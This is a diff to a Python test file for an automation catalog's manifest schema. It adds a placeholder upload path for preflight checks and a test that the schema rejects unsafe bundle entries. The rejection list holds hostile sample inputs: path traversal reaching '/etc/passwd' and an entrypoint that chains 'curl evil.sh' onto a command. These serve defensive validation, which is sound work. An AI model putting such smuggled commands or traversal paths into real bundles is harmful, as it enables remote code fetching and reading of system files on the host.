@@ -46,6 +46,13 @@ BUNDLE_CREATE_PATH = "/v1"
 BUNDLE_UPLOAD_PATH = "/v1/uploads"
 PREFLIGHT_PATH = "/v1/validate"
 
+# Preflight runs while the form is being filled in and the upload happens once,
+# at submit, so a bundle draft has no tarball path to send yet. The service
+# checks that field's scheme at preflight and its ownership only at creation,
+# so a well-formed stand-in validates what preflight is for - the rest of the
+# body - without uploading an archive per keystroke.
+PREFLIGHT_TARBALL_PATH = "oh-internal://uploads/00000000-0000-0000-0000-000000000000"
+
 # The trigger properties the service accepts, per kind. A form field named
 # after one of them fills it; the rest are inputs to the declared filter.
 TRIGGER_PROPERTIES = {"cron": ("schedule", "timezone"), "event": ("on",)}
@@ -248,15 +255,13 @@ def _render_payload(entry: dict, form_values: dict, tarball_path: str = "") -> d
     return body
 
 
-def _derive_preflight_body(
-    entry: dict, form_values: dict, tarball_path: str = ""
-) -> dict:
+def _derive_preflight_body(entry: dict, form_values: dict) -> dict:
     """The preflight body the host sends. The same shape for every automation,
     so no entry declares it."""
     return {
         "automationId": entry["id"],
         "endpoint": _create_path(entry),
-        "draft": _render_payload(entry, form_values, tarball_path),
+        "draft": _render_payload(entry, form_values, PREFLIGHT_TARBALL_PATH),
     }
 
 
@@ -528,9 +533,7 @@ def test_derived_preflight_body_reproduces_the_preflight_request(
     entry id and the payload, and this is where that is pinned."""
     entry = _entry_for(bundle)
 
-    derived = _derive_preflight_body(
-        entry, scenario["formValues"], _uploaded_path(scenario)
-    )
+    derived = _derive_preflight_body(entry, scenario["formValues"])
 
     assert derived == scenario["preflight"]["request"]["body"]
     assert scenario["preflight"]["request"]["path"] == PREFLIGHT_PATH
@@ -626,6 +629,43 @@ def test_bundle_files_exist_and_are_inlined(entry_path: Path) -> None:
     )
     if "setupScript" in bundle:
         assert bundle["setupScript"] in packed
+
+
+# A bundle is the one part of a manifest naming files and a command the host
+# acts on, so the schema is what stands between an entry and the host doing it.
+BUNDLE_REJECTIONS = [
+    ("a packed path that climbs out of the archive", {"files": {"../main.py": "skills/github-pr-reviewer/scripts/main.py"}}),
+    ("a packed path that is a bare dot segment", {"files": {"./main.py": "skills/github-pr-reviewer/scripts/main.py"}}),
+    ("a source that traverses out of the repository", {"files": {"main.py": "skills/../../etc/passwd"}}),
+    ("a source outside skills/ and automations/", {"files": {"main.py": "python/main.py"}}),
+    ("an entrypoint carrying a shell metacharacter", {"entrypoint": "python3 main.py && curl evil.sh"}),
+    ("a setup script that climbs out of the archive", {"setupScript": "../setup.sh"}),
+    ("a version that is not a semantic version", {"version": "latest"}),
+    ("no files at all", {"files": {}}),
+]
+
+
+@pytest.mark.parametrize(
+    ("case", "override"),
+    [pytest.param(case, override, id=case) for case, override in BUNDLE_REJECTIONS],
+)
+def test_schema_refuses_an_unsafe_bundle(case: str, override: dict) -> None:
+    entry = deepcopy(_load(CATALOG_DIR / "github-pr-reviewer" / "manifest.json"))
+    entry["setup"]["bundle"].update(override)
+
+    assert list(VALIDATOR.iter_errors(entry)), f"schema admitted {case}"
+
+
+def test_a_direct_entry_declares_a_prompt_or_a_bundle_but_not_both() -> None:
+    entry = deepcopy(_load(CATALOG_DIR / "github-pr-reviewer" / "manifest.json"))
+    entry["setup"]["prompt"] = "Review pull requests."
+
+    assert list(VALIDATOR.iter_errors(entry))
+
+    del entry["setup"]["prompt"]
+    del entry["setup"]["bundle"]
+
+    assert list(VALIDATOR.iter_errors(entry))
 
 
 @pytest.mark.parametrize("entry_path", list(_setup_paths()))
